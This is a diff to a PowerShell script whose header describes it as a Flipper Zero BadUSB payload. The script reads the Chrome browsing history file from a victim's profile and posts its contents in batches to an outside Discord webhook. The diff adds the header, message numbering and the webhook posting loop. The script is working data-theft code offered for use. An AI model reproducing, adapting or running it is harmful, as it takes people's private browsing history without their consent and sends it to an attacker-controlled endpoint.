@@ -1,4 +1,14 @@
+###############
+Powershell Script to retrieve Chrome browsing history and send it via webhook to your own discord server.
+Technically for use in Flipper Zero BadUSB
+6/17/2023
+-JW
+################
+
+
+
 $filePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\history"
+
 
 # Check if the file exists
 if (!(Test-Path $filePath)) {
@@ -28,15 +38,22 @@ foreach ($url in $urls) {
 # Add the last message
 $messages += $currentMessage
 
+$totalMessages = $messages.Count
+$currentMessageNumber = 1
+
 # Send each message to Discord webhook with a delay of 0.5 seconds
 foreach ($message in $messages) {
+    $content = "Message $currentMessageNumber of $totalMessages`n$message"
+
     $body = @{
-        "content" = $message
+        "content" = $content
     } | ConvertTo-Json
 
     Invoke-RestMethod -Uri $endpoint -Method Post -ContentType "application/json" -Body $body
 
     Start-Sleep -Milliseconds 500  # Delay for 0.5 seconds
+
+    $currentMessageNumber++
 }
 
 # Display success message
